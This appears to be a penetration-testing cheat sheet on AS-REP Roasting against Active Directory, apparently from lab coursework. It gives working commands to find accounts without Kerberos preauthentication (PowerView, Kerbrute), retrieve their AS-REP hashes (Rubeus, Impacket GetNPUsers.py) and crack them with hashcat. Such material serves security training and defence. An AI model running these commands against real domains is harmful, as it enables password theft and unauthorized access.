# AS-REP Roasting
**Concept:** Normally, when a user asks the Domain Controller (DC) for a Ticket (TGT), they must encrypt a timestamp with their password hash to prove who they are (**Pre-Authentication**). 
**The Vulnerability:** If **"Do not require Kerberos preauthentication"** is enabled for a user, the DC will happily send the TGT (AS-REP) to _anyone_ who asks, encrypted with that user's password hash. 
**The Attack:** We ask for the ticket, save the encrypted chunk, and crack it offline to get the password.
## 1. Identification (Hunting the Property)
We need to find users with the `DONT_REQ_PREAUTH` flag set.
### From Windows (PowerView)
```powershell
# Get users with PreauthNotRequired set
Get-DomainUser -PreauthNotRequired | select samaccountname, userprincipalname, useraccountcontrol | fl
```
### From Linux (Impacket / Kerbrute)
You can identify these users remotely without authentication if you have a list of usernames.
```shell
# Kerbrute (User Enum + Roast Check)
# Enumerates valid users and checks if they are roastable
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 users.txt
```
## 2. Exploitation (Retrieving the Hash)
### Windows (Rubeus)
**Tool:** `Rubeus` (C#). 
**Action:** Automatically finds vulnerable users, requests the ticket, and formats it for Hashcat.
```powershell
# /nowrap: Clean output
# /format:hashcat: Format specifically for mode 18200
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
```
### Linux (Impacket)
**Tool:** `GetNPUsers.py` (Impacket). 
**Action:** Requests the TGT for vulnerable users. 
**Requirement:** You need a list of valid users (`users.txt`) or a compromised account.
```shell
# -no-pass: We don't have a password for the target user
# -usersfile: List of users to check
python3 GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users.txt
```
## 3. Cracking the Hash (Hashcat)
**Hash Type:** Kerberos 5, etype 23, AS-REP. 
**Hashcat Mode:** `18200`.
```shell
# Syntax: hashcat -m 18200 <hash_file> <wordlist>
hashcat -m 18200 ilfreight_asrep.txt /usr/share/wordlists/rockyou.txt
```
